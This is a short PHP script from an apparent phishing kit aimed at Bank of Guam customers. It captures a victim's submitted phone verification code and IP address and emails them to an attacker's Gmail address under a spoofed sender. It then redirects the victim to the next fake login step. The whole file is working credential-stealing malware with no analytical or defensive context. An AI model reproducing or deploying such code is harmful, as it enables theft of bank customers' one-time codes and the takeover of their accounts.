<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user = $_POST['acod'];
$fiftyme="zate123man@gmail.com";


  $subj = "BankofGuam $ip";
  $msg = "Phone Info\n\nPhone Code: $user\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>

<script type="text/javascript">
 window.location="Login_step_3.html"
</script>
